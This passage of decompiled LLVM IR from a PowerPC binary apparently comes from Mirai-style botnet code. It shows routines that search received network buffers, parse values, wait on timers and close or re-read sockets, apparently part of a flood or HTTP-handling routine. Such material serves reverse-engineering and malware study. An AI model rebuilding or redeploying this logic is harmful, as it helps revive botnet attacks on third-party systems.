dec_label_pc_10001d8c:                            ; preds = %dec_label_pc_10001d68
  %v1_10001d8c = icmp slt i32 %v4_10001d80, -1
  %v3_10001d8c = icmp eq i32 %v4_10001d80, -1
  store i1 %v1_10001d8c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001d8c, i1* %cr7_eq.global-to-local, align 1
  %v0_10001d94 = load i32, i32* @r31, align 4
  br i1 %v3_10001d8c, label %dec_label_pc_10001d94, label %dec_label_pc_10001d68

dec_label_pc_10001d94:                            ; preds = %dec_label_pc_10001d8c
  %v1_10001d94 = inttoptr i32 %v0_10001d94 to i32*
  %v2_10001d94 = load i32, i32* %v1_10001d94, align 4
  store i32 %v2_10001d94, i32* %r0.global-to-local, align 4
  %v1_10001d98 = icmp slt i32 %v2_10001d94, 11
  %v3_10001d98 = icmp eq i32 %v2_10001d94, 11
  store i1 %v1_10001d98, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001d98, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001d98, label %dec_label_pc_10001da0, label %dec_label_pc_10001624

dec_label_pc_10001da0:                            ; preds = %dec_label_pc_10001d94
  %v0_10001da0 = load i32, i32* @r30, align 4
  %v1_10001da0 = add i32 %v0_10001da0, 4
  %v2_10001da0 = inttoptr i32 %v1_10001da0 to i8*
  %v3_10001da0 = load i8, i8* %v2_10001da0, align 1
  %v4_10001da0 = zext i8 %v3_10001da0 to i32
  store i32 %v4_10001da0, i32* %r0.global-to-local, align 4
  %v3_10001da4 = icmp eq i8 %v3_10001da0, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001da4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001da4, label %dec_label_pc_10001038, label %dec_label_pc_10001dac

dec_label_pc_10001dac:                            ; preds = %dec_label_pc_10001da0
  store i32 1, i32* %r0.global-to-local, align 4
  store i8 1, i8* %v2_10001da0, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001db8:                            ; preds = %dec_label_pc_10001404
  %v0_10001db8 = load i32, i32* %r22.global-to-local, align 4
  store i32 %v0_10001db8, i32* @r3, align 4
  %v0_10001dbc = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001dbc, i32* %r4.global-to-local, align 4
  %v2_10001dc0 = inttoptr i32 %v0_10001db8 to i8*
  %v3_10001dc0 = call i32 @util_strcpy(i8* %v2_10001dc0, i32 %v0_10001dbc)
  store i32 %v3_10001dc0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1000141c

dec_label_pc_10001dc8:                            ; preds = %dec_label_pc_10001510
  %v0_10001dc8 = load i32, i32* %r26.global-to-local, align 4
  %v1_10001dc8 = inttoptr i32 %v0_10001dc8 to i32*
  %v2_10001dc8 = load i32, i32* %v1_10001dc8, align 4
  store i32 %v2_10001dc8, i32* %r0.global-to-local, align 4
  %v1_10001dcc = icmp slt i32 %v2_10001dc8, 11
  %v3_10001dcc = icmp eq i32 %v2_10001dc8, 11
  store i1 %v1_10001dcc, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001dcc, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001dcc, label %dec_label_pc_10001038, label %dec_label_pc_10001dd4

dec_label_pc_10001dd4:                            ; preds = %dec_label_pc_10001dc8
  %v0_10001dd4 = load i32, i32* @r30, align 4
  %v1_10001dd4 = inttoptr i32 %v0_10001dd4 to i32*
  %v2_10001dd4 = load i32, i32* %v1_10001dd4, align 4
  store i32 %v2_10001dd4, i32* @r3, align 4
  %v0_10001dd8 = call i32 @__GI___libc_close()
  store i32 %v0_10001dd8, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_10001de4 = load i32, i32* @r30, align 4
  %v2_10001de4 = inttoptr i32 %v1_10001de4 to i32*
  store i32 -1, i32* %v2_10001de4, align 4
  %v0_10001de8 = load i32, i32* %r9.global-to-local, align 4
  %v1_10001de8 = trunc i32 %v0_10001de8 to i8
  %v2_10001de8 = load i32, i32* @r30, align 4
  %v3_10001de8 = add i32 %v2_10001de8, 4
  %v4_10001de8 = inttoptr i32 %v3_10001de8 to i8*
  store i8 %v1_10001de8, i8* %v4_10001de8, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10001df0:                            ; preds = %dec_label_pc_10001bc0, %dec_label_pc_10001b9c
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v3_10001df8 = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_10001dfc = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001dfc, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001e08 = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001dfc, i32 %v3_10001df8)
  store i32 %v4_10001e08, i32* %r3.global-to-local, align 4
  %v1_10001e0c = icmp slt i32 %v4_10001e08, -1
  %v3_10001e0c = icmp eq i32 %v4_10001e08, -1
  store i1 %v1_10001e0c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001e0c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001e0c, label %dec_label_pc_10001fec, label %dec_label_pc_10001e14

dec_label_pc_10001e14:                            ; preds = %dec_label_pc_10001df0
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  %v3_10001e1c = call i32 @table_retrieve_val(i32 44, i32* null)
  %v0_10001e20 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001e20, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v4_10001e2c = call i32 @util_stristr(i8* %v3_100017bc, i32 %v0_10001e20, i32 %v3_10001e1c)
  store i32 %v4_10001e2c, i32* %r3.global-to-local, align 4
  %v0_10001e30 = load i32, i32* %r16.global-to-local, align 4
  %v0_10001e34 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001e34 = add i32 %v0_10001e34, %v4_10001e2c
  store i32 %v2_10001e34, i32* %r9.global-to-local, align 4
  %v1_10001e3c = add i32 %v2_10001e34, 10532
  %v2_10001e3c = inttoptr i32 %v1_10001e3c to i8*
  %v3_10001e3c = load i8, i8* %v2_10001e3c, align 1
  %v4_10001e3c = zext i8 %v3_10001e3c to i32
  store i32 %v4_10001e3c, i32* %r0.global-to-local, align 4
  %v1_10001e40 = xor i32 %v4_10001e3c, 32
  %v1_10001e44 = sub nsw i32 0, %v1_10001e40
  %v2_10001e44 = xor i32 %v4_10001e3c, -33
  %v4_10001e44 = icmp uge i32 %v2_10001e44, %v1_10001e44
  %v2_10001e48 = zext i1 %v4_10001e44 to i32
  %v3_10001e48 = add i32 %v2_10001e48, %v4_10001e2c
  store i32 %v3_10001e48, i32* %r9.global-to-local, align 4
  %v0_10001e4c = load i32, i32* %r20.global-to-local, align 4
  %v2_10001e4c = add i32 %v3_10001e48, %v0_10001e4c
  store i32 %v2_10001e4c, i32* @r28, align 4
  store i32 %v2_10001e4c, i32* %r3.global-to-local, align 4
  %v1_10001e54 = load i32, i32* %r25.global-to-local, align 4
  %v2_10001e54 = sub i32 %v1_10001e54, %v3_10001e48
  store i32 %v2_10001e54, i32* %r4.global-to-local, align 4
  store i32 %v3_10001e48, i32* %r31.global-to-local, align 4
  %v4_10001e5c = call i32 @util_memsearch(i32 %v2_10001e4c, i32 %v2_10001e54, i32 %v0_10001e30, i32 2)
  store i32 %v4_10001e5c, i32* %r3.global-to-local, align 4
  %v1_10001e60 = icmp slt i32 %v4_10001e5c, -1
  %v3_10001e60 = icmp eq i32 %v4_10001e5c, -1
  store i1 %v1_10001e60, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001e60, i1* %cr7_eq.global-to-local, align 1
  store i32 %v4_10001e5c, i32* %r27.global-to-local, align 4
  br i1 %v3_10001e60, label %dec_label_pc_10001fec, label %dec_label_pc_10001e6c

dec_label_pc_10001e6c:                            ; preds = %dec_label_pc_10001e14
  %v1_10001e6c = icmp slt i32 %v4_10001e5c, 1
  %v3_10001e6c = icmp eq i32 %v4_10001e5c, 1
  store i1 %v1_10001e6c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001e6c, i1* %cr7_eq.global-to-local, align 1
  %tmp130 = icmp slt i32 %v4_10001e5c, 2
  br i1 %tmp130, label %dec_label_pc_10001e78, label %dec_label_pc_10001e74

dec_label_pc_10001e74:                            ; preds = %dec_label_pc_10001e6c
  %v1_10001e74 = add i32 %v4_10001e5c, -2
  store i32 %v1_10001e74, i32* %r27.global-to-local, align 4
  br label %dec_label_pc_10001e78

dec_label_pc_10001e78:                            ; preds = %dec_label_pc_10001e6c, %dec_label_pc_10001e74
  %v1_10001e78 = phi i32 [ %v4_10001e5c, %dec_label_pc_10001e6c ], [ %v1_10001e74, %dec_label_pc_10001e74 ]
  %v0_10001e78 = load i32, i32* %r21.global-to-local, align 4
  %v2_10001e78 = add i32 %v0_10001e78, %v1_10001e78
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001e84 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001e84 = add i32 %v2_10001e78, %v1_10001e84
  store i32 %v2_10001e84, i32* %r9.global-to-local, align 4
  %v3_10001e88 = add i32 %v2_10001e84, 10532
  %v4_10001e88 = inttoptr i32 %v3_10001e88 to i8*
  store i8 0, i8* %v4_10001e88, align 1
  %v0_10001e8c = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_10001e8c, i32* %stack_var_-20888, align 4
  %v0_10001e90 = load i32, i32* @r28, align 4
  store i32 %v0_10001e90, i32* %r4.global-to-local, align 4
  %v0_10001e94 = load i32, i32* %r20.global-to-local, align 4
  %v1_10001e94 = load i32, i32* %r31.global-to-local, align 4
  %v2_10001e94 = add i32 %v1_10001e94, %v0_10001e94
  %v3_10001e94 = inttoptr i32 %v2_10001e94 to i8*
  %v4_10001e94 = load i8, i8* %v3_10001e94, align 1
  %v5_10001e94 = zext i8 %v4_10001e94 to i32
  store i32 %v5_10001e94, i32* %r3.global-to-local, align 4
  %v1_10001e98 = add nuw nsw i32 %v5_10001e94, 208
  %v1_10001e9c = urem i32 %v1_10001e98, 256
  store i32 %v1_10001e9c, i32* %r0.global-to-local, align 4
  %v1_10001ea0 = icmp ult i32 %v1_10001e9c, 9
  %v2_10001ea0 = icmp ugt i32 %v1_10001e9c, 9
  %v3_10001ea0 = icmp eq i32 %v1_10001e9c, 9
  store i1 %v1_10001ea0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ea0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v2_10001ea0, label %dec_label_pc_10001ed0, label %dec_label_pc_10001ea8

dec_label_pc_10001ea8:                            ; preds = %dec_label_pc_10001e78
  store i32 1, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_10001eac

dec_label_pc_10001eac:                            ; preds = %dec_label_pc_10001eac, %dec_label_pc_10001ea8
  %v0_10001eac = phi i32 [ %v1_10001eb4, %dec_label_pc_10001eac ], [ 1, %dec_label_pc_10001ea8 ]
  store i32 %v0_10001eac, i32* %stack_var_-20888, align 4
  store i32 %v0_10001eac, i32* %r4.global-to-local, align 4
  %v1_10001eb4 = add i32 %v0_10001eac, 1
  store i32 %v1_10001eb4, i32* %r11.global-to-local, align 4
  %v2_10001eb8 = add i32 %v0_10001eac, %v0_10001e90
  %v3_10001eb8 = inttoptr i32 %v2_10001eb8 to i8*
  %v4_10001eb8 = load i8, i8* %v3_10001eb8, align 1
  %v5_10001eb8 = zext i8 %v4_10001eb8 to i32
  store i32 %v5_10001eb8, i32* %r3.global-to-local, align 4
  store i32 %v2_10001eb8, i32* %r4.global-to-local, align 4
  %v1_10001ec0 = add nuw nsw i32 %v5_10001eb8, 208
  %v1_10001ec4 = urem i32 %v1_10001ec0, 256
  store i32 %v1_10001ec4, i32* %r0.global-to-local, align 4
  %v1_10001ec8 = icmp ult i32 %v1_10001ec4, 9
  %v3_10001ec8 = icmp eq i32 %v1_10001ec4, 9
  store i1 %v1_10001ec8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ec8, i1* %cr7_eq.global-to-local, align 1
  %tmp131 = icmp ult i32 %v1_10001ec4, 10
  br i1 %tmp131, label %dec_label_pc_10001eac, label %dec_label_pc_10001ed0

dec_label_pc_10001ed0:                            ; preds = %dec_label_pc_10001eac, %dec_label_pc_10001e78
  %v2_10001edc = phi i32 [ %v0_10001e90, %dec_label_pc_10001e78 ], [ %v2_10001eb8, %dec_label_pc_10001eac ]
  %v0_10001ed0 = phi i32 [ %v5_10001e94, %dec_label_pc_10001e78 ], [ %v5_10001eb8, %dec_label_pc_10001eac ]
  %v3_10001ed0 = icmp eq i32 %v0_10001ed0, 0
  store i1 false, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ed0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001ed0, label %dec_label_pc_10001fec, label %dec_label_pc_10001ed8

dec_label_pc_10001ed8:                            ; preds = %dec_label_pc_10001ed0
  store i32 0, i32* %r31.global-to-local, align 4
  %v3_10001edc = inttoptr i32 %v2_10001edc to i8*
  store i8 0, i8* %v3_10001edc, align 1
  %v3_10001ee0 = load i32, i32* %stack_var_-20888, align 4
  %v1_10001ee4 = add i32 %v3_10001ee0, 1
  store i32 %v1_10001ee4, i32* %r4.global-to-local, align 4
  store i32 %v1_10001ee4, i32* %stack_var_-20888, align 4
  %v0_10001eec = load i32, i32* @r28, align 4
  %v2_10001eec = add i32 %v0_10001eec, %v1_10001ee4
  %v3_10001eec = inttoptr i32 %v2_10001eec to i8*
  %v4_10001eec = load i8, i8* %v3_10001eec, align 1
  %v5_10001eec = zext i8 %v4_10001eec to i32
  store i32 %v5_10001eec, i32* %r0.global-to-local, align 4
  %v1_10001ef0 = icmp ult i8 %v4_10001eec, 32
  %v3_10001ef0 = icmp eq i8 %v4_10001eec, 32
  store i1 %v1_10001ef0, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001ef0, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001ef0, label %dec_label_pc_1000236c, label %dec_label_pc_10001ef8

dec_label_pc_10001ef8:                            ; preds = %dec_label_pc_10001ed8, %dec_label_pc_1000236c
  %v1_10001ef8 = phi i32 [ %v1_10001ee4, %dec_label_pc_10001ed8 ], [ %v1_1000236c, %dec_label_pc_1000236c ]
  %v2_10001ef8 = add i32 %v1_10001ef8, %v0_10001eec
  store i32 %v2_10001ef8, i32* %r29.global-to-local, align 4
  store i32 %v2_10001ef8, i32* %r3.global-to-local, align 4
  store i32 268443396, i32* @lr, align 4
  %v1_10001f00 = inttoptr i32 %v2_10001ef8 to i8*
  %v2_10001f00 = call i32 @util_strlen(i8* %v1_10001f00)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_10001f00, i32* %r4.global-to-local, align 4
  %v0_10001f10 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001f10, i32* %r3.global-to-local, align 4
  %v4_10001f14 = inttoptr i32 %v0_10001f10 to i8*
  %v5_10001f14 = call i32 @util_stristr(i8* %v4_10001f14, i32 %v2_10001f00, i32 ptrtoint ([5 x i8]* @global_var_100100f8.22 to i32))
  store i32 %v5_10001f14, i32* %r3.global-to-local, align 4
  %v1_10001f18 = icmp slt i32 %v5_10001f14, -1
  %v3_10001f18 = icmp eq i32 %v5_10001f14, -1
  store i1 %v1_10001f18, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001f18, i1* %cr7_eq.global-to-local, align 1
  %v3_100022c8 = load i32, i32* %stack_var_-20888, align 4
  br i1 %v3_10001f18, label %dec_label_pc_100022c8, label %dec_label_pc_10001f20

dec_label_pc_10001f20:                            ; preds = %dec_label_pc_10001ef8
  %v0_10001f24 = load i32, i32* @r28, align 4
  %v2_10001f24 = add i32 %v0_10001f24, %v3_100022c8
  store i32 %v2_10001f24, i32* %r29.global-to-local, align 4
  store i32 %v2_10001f24, i32* %r3.global-to-local, align 4
  store i32 268443440, i32* @lr, align 4
  %v1_10001f2c = inttoptr i32 %v2_10001f24 to i8*
  %v2_10001f2c = call i32 @util_strlen(i8* %v1_10001f2c)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_10001f2c, i32* %r4.global-to-local, align 4
  %v0_10001f3c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_10001f3c, i32* %r3.global-to-local, align 4
  %v4_10001f40 = inttoptr i32 %v0_10001f3c to i8*
  %v5_10001f40 = call i32 @util_stristr(i8* %v4_10001f40, i32 %v2_10001f2c, i32 ptrtoint ([5 x i8]* @global_var_100100f8.22 to i32))
  store i32 %v5_10001f40, i32* %r3.global-to-local, align 4
  %v3_10001f44 = load i32, i32* %stack_var_-20888, align 4
  %v2_10001f48 = add i32 %v3_10001f44, %v5_10001f40
  store i32 %v2_10001f48, i32* %r4.global-to-local, align 4
  store i32 %v2_10001f48, i32* %stack_var_-20888, align 4
  br label %dec_label_pc_10001f50

dec_label_pc_10001f50:                            ; preds = %dec_label_pc_100022c8, %dec_label_pc_10001f20
  %v0_100023f8 = phi i32 [ %v3_100022c8, %dec_label_pc_100022c8 ], [ %v2_10001f48, %dec_label_pc_10001f20 ]
  %v0_10001f50 = load i32, i32* @r28, align 4
  %v2_10001f50 = add i32 %v0_10001f50, %v0_100023f8
  %v3_10001f50 = inttoptr i32 %v2_10001f50 to i8*
  %v4_10001f50 = load i8, i8* %v3_10001f50, align 1
  %v5_10001f50 = zext i8 %v4_10001f50 to i32
  store i32 %v5_10001f50, i32* %r0.global-to-local, align 4
  %v1_10001f54 = icmp ult i8 %v4_10001f50, 34
  %v3_10001f54 = icmp eq i8 %v4_10001f50, 34
  store i1 %v1_10001f54, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001f54, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001f54, label %dec_label_pc_100023f8, label %dec_label_pc_10001f5c

dec_label_pc_10001f5c:                            ; preds = %dec_label_pc_100023f8, %dec_label_pc_10001f50, %dec_label_pc_1000241c
  %v0_10001f5c = load i32, i32* @r28, align 4
  store i32 %v0_10001f5c, i32* @r3, align 4
  store i32 10, i32* %r4.global-to-local, align 4
  store i32 268443496, i32* @lr, align 4
  %v2_10001f64 = call i32 @util_atoi(i32 %v0_10001f5c, i32 10)
  store i32 %v2_10001f64, i32* %r3.global-to-local, align 4
  %v1_10001f68 = add i32 %v2_10001f64, -1
  store i32 %v1_10001f68, i32* %r0.global-to-local, align 4
  %v1_10001f6c = load i32, i32* %r17.global-to-local, align 4
  %v2_10001f6c = add i32 %v1_10001f6c, %v2_10001f64
  store i32 %v2_10001f6c, i32* @r31, align 4
  %v1_10001f70 = icmp ult i32 %v1_10001f68, 8
  %v3_10001f70 = icmp eq i32 %v1_10001f68, 8
  store i1 %v1_10001f70, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001f70, i1* %cr7_eq.global-to-local, align 1
  %tmp132 = icmp ult i32 %v1_10001f68, 9
  br i1 %tmp132, label %dec_label_pc_10001f84.preheader, label %dec_label_pc_10001f94

dec_label_pc_10001f84.preheader:                  ; preds = %dec_label_pc_10001f5c
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10001f8813 = call i32 @__GI_time()
  store i32 %v0_10001f8813, i32* %r3.global-to-local, align 4
  %v0_10001f8c14 = load i32, i32* @r31, align 4
  %v2_10001f8c15 = icmp ult i32 %v0_10001f8c14, %v0_10001f8813
  %v3_10001f8c16 = icmp ugt i32 %v0_10001f8c14, %v0_10001f8813
  %v4_10001f8c17 = icmp eq i32 %v0_10001f8c14, %v0_10001f8813
  store i1 %v2_10001f8c15, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001f8c17, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001f8c16, label %dec_label_pc_10001f7c, label %dec_label_pc_10001f94

dec_label_pc_10001f7c:                            ; preds = %dec_label_pc_10001f84.preheader, %dec_label_pc_10001f7c
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10001f84.66 to i32), i32* @lr, align 4
  %v1_10001f80 = call i32 @sleep(i32 1)
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_10001f88 = call i32 @__GI_time()
  store i32 %v0_10001f88, i32* %r3.global-to-local, align 4
  %v0_10001f8c = load i32, i32* @r31, align 4
  %v2_10001f8c = icmp ult i32 %v0_10001f8c, %v0_10001f88
  %v3_10001f8c = icmp ugt i32 %v0_10001f8c, %v0_10001f88
  %v4_10001f8c = icmp eq i32 %v0_10001f8c, %v0_10001f88
  store i1 %v2_10001f8c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v4_10001f8c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001f8c, label %dec_label_pc_10001f7c, label %dec_label_pc_10001f94

dec_label_pc_10001f94:                            ; preds = %dec_label_pc_10001f7c, %dec_label_pc_10001f84.preheader, %dec_label_pc_10001f5c
  %v3_10001f94 = load i32, i32* %stack_var_-20888, align 4
  store i32 %v3_10001f94, i32* %r29.global-to-local, align 4
  %v0_10001f98 = load i32, i32* @r28, align 4
  %v2_10001f98 = add i32 %v0_10001f98, %v3_10001f94
  store i32 %v2_10001f98, i32* %r31.global-to-local, align 4
  store i32 %v2_10001f98, i32* %r3.global-to-local, align 4
  store i32 268443556, i32* @lr, align 4
  %v1_10001fa0 = inttoptr i32 %v2_10001f98 to i8*
  %v2_10001fa0 = call i32 @util_strlen(i8* %v1_10001fa0)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 %v2_10001fa0, i32* %r4.global-to-local, align 4
  %v0_10001fb0 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10001fb0, i32* %r3.global-to-local, align 4
  %v4_10001fb4 = inttoptr i32 %v0_10001fb0 to i8*
  %v5_10001fb4 = call i32 @util_stristr(i8* %v4_10001fb4, i32 %v2_10001fa0, i32 ptrtoint ([5 x i8]* @global_var_100100f0.21 to i32))
  store i32 %v5_10001fb4, i32* %r3.global-to-local, align 4
  %v1_10001fb8 = icmp slt i32 %v5_10001fb4, 4
  %v3_10001fb8 = icmp eq i32 %v5_10001fb4, 4
  store i1 %v1_10001fb8, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001fb8, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001fb8, label %dec_label_pc_10002378, label %dec_label_pc_10001fc0

dec_label_pc_10001fc0:                            ; preds = %dec_label_pc_10001f94
  %v0_10001fc0 = load i32, i32* @r28, align 4
  %v1_10001fc0 = load i32, i32* %r29.global-to-local, align 4
  %v2_10001fc0 = add i32 %v1_10001fc0, %v0_10001fc0
  %v3_10001fc0 = inttoptr i32 %v2_10001fc0 to i8*
  %v4_10001fc0 = load i8, i8* %v3_10001fc0, align 1
  %v5_10001fc0 = zext i8 %v4_10001fc0 to i32
  store i32 %v5_10001fc0, i32* %r0.global-to-local, align 4
  %v1_10001fc4 = icmp ult i8 %v4_10001fc0, 47
  %v3_10001fc4 = icmp eq i8 %v4_10001fc0, 47
  store i1 %v1_10001fc4, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_10001fc4, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_10001fc4, label %dec_label_pc_10002310, label %dec_label_pc_10001fcc

dec_label_pc_10001fcc:                            ; preds = %dec_label_pc_10002328, %dec_label_pc_10002310, %dec_label_pc_10001fc0, %dec_label_pc_1000234c
  %v2_10001fd0 = load i32, i32* @r30, align 4
  %v3_10001fd0 = add i32 %v2_10001fd0, 4
  %v4_10001fd0 = inttoptr i32 %v3_10001fd0 to i8*
  store i8 10, i8* %v4_10001fd0, align 1
  store i32 1195725824, i32* %r0.global-to-local, align 4
  %v1_10001fd8 = load i32, i32* @r30, align 4
  %v2_10001fd8 = add i32 %v1_10001fd8, 1431
  %v3_10001fd8 = inttoptr i32 %v2_10001fd8 to i32*
  store i32 1195725824, i32* %v3_10001fd8, align 4
  br label %dec_label_pc_10001038

dec_label_pc_10001fe0:                            ; preds = %dec_label_pc_1000199c
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_10001fe4 = load i32, i32* @r30, align 4
  %v2_10001fe4 = add i32 %v1_10001fe4, 1464
  %v3_10001fe4 = inttoptr i32 %v2_10001fe4 to i32*
  store i32 0, i32* %v3_10001fe4, align 4
  br label %dec_label_pc_10001a40

dec_label_pc_10001fec:                            ; preds = %dec_label_pc_10001ed0, %dec_label_pc_10001e14, %dec_label_pc_10001df0
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10001ff0 = load i32, i32* %r25.global-to-local, align 4
  store i32 %v0_10001ff0, i32* %r4.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r3.global-to-local, align 4
  %v0_10002000 = load i32, i32* @r30, align 4
  %v1_10002000 = add i32 %v0_10002000, 1431
  store i32 %v1_10002000, i32* %r31.global-to-local, align 4
  %v5_10002004 = call i32 @util_memsearch(i32 %v2_10000a9c, i32 %v0_10001ff0, i32 ptrtoint ([5 x i8]* @global_var_100100e4.19 to i32), i32 4)
  store i32 268500992, i32* %r9.global-to-local, align 4
  store i32 ptrtoint ([5 x i8]* @global_var_10010100.23 to i32), i32* %r4.global-to-local, align 4
  store i32 %v5_10002004, i32* %r29.global-to-local, align 4
  %v0_10002014 = load i32, i32* %r31.global-to-local, align 4
  store i32 %v0_10002014, i32* %r3.global-to-local, align 4
  %v3_10002018 = inttoptr i32 %v0_10002014 to i8*
  %v4_10002018 = call i32 @util_strcmp(i8* %v3_10002018, i32 ptrtoint ([5 x i8]* @global_var_10010100.23 to i32))
  store i32 %v4_10002018, i32* %r3.global-to-local, align 4
  %v1_1000201c = icmp slt i32 %v4_10002018, 0
  %v3_1000201c = icmp eq i32 %v4_10002018, 0
  store i1 %v1_1000201c, i1* %cr7_lt.global-to-local, align 1
  store i1 %v3_1000201c, i1* %cr7_eq.global-to-local, align 1
  br i1 %v3_1000201c, label %dec_label_pc_100021d0, label %dec_label_pc_10002024

dec_label_pc_10002024:                            ; preds = %dec_label_pc_100021d0, %dec_label_pc_10001fec
  store i32 7, i32* %r0.global-to-local, align 4
  %v2_10002028 = load i32, i32* @r30, align 4
  %v3_10002028 = add i32 %v2_10002028, 4
  %v4_10002028 = inttoptr i32 %v3_10002028 to i8*
  store i8 7, i8* %v4_10002028, align 1
  br label %dec_label_pc_1000202c

dec_label_pc_1000202c:                            ; preds = %dec_label_pc_10002360, %dec_label_pc_100021f0, %dec_label_pc_10002024
  %v0_1000202c = load i32, i32* @r30, align 4
  %v1_1000202c = inttoptr i32 %v0_1000202c to i32*
  %v2_1000202c = load i32, i32* %v1_1000202c, align 4
  store i32 %v2_1000202c, i32* %r3.global-to-local, align 4
  %v0_10002030 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v2_10000a9c, i32* %r4.global-to-local, align 4
  store i32 268443712, i32* @lr, align 4
  %v4_1000203c = call i32 @__libc_recv(i32 %v2_1000202c, i32 %v2_10000a9c, i32 %v0_10002030, i32 16384)
  store i32 %v4_1000203c, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_10001038

dec_label_pc_10002044:                            ; preds = %dec_label_pc_10001d68
  store i32 104, i32* %r0.global-to-local, align 4
  %v1_10002048 = load i32, i32* @r31, align 4
  %v2_10002048 = inttoptr i32 %v1_10002048 to i32*
  store i32 104, i32* %v2_10002048, align 4
  %v0_1000204c = load i32, i32* @r30, align 4
  %v1_1000204c = inttoptr i32 %v0_1000204c to i32*
  %v2_1000204c = load i32, i32* %v1_1000204c, align 4
  store i32 %v2_1000204c, i32* @r3, align 4
  %v0_10002050 = call i32 @__GI___libc_close()
  store i32 %v0_10002050, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r9.global-to-local, align 4
  %v1_1000205c = load i32, i32* @r30, align 4
  %v2_1000205c = inttoptr i32 %v1_1000205c to i32*
  store i32 -1, i32* %v2_1000205c, align 4
  %v0_10002060 = load i32, i32* %r9.global-to-local, align 4
  %v1_10002060 = trunc i32 %v0_10002060 to i8
  %v2_10002060 = load i32, i32* @r30, align 4
  %v3_10002060 = add i32 %v2_10002060, 4
  %v4_10002060 = inttoptr i32 %v3_10002060 to i8*
  store i8 %v1_10002060, i8* %v4_10002060, align 1
  br label %dec_label_pc_10001038

dec_label_pc_10002068:                            ; preds = %dec_label_pc_10001648
  %v1_10002068 = add i32 %v0_10001670, 2112
  %v2_10002068 = inttoptr i32 %v1_10002068 to i32*
  %v3_10002068 = load i32, i32* %v2_10002068, align 4
  store i32 %v3_10002068, i32* %r29.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  store i32 43, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r26.global-to-local, align 4
  %v3_10002078 = call i32 @table_retrieve_val(i32 43, i32* null)
  %v0_1000207c = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_1000207c, i32* %r4.global-to-local, align 4
  %v0_10002088 = load i32, i32* @r27, align 4
  store i32 %v0_10002088, i32* %r3.global-to-local, align 4
  %v4_1000208c = call i32 @util_memsearch(i32 %v0_10002088, i32 %v0_1000207c, i32 %v3_10002078, i32 11)
  store i32 %v4_1000208c, i32* %r3.global-to-local, align 4
  store i32 268500992, i32* %r9.global-to-local, align 4
  %v0_10002094 = load i32, i32* @r30, align 4
  %v1_10002094 = add i32 %v0_10002094, 2112
  %v2_10002094 = inttoptr i32 %v1_10002094 to i32*
  %v3_10002094 = load i32, i32* %v2_10002094, align 4
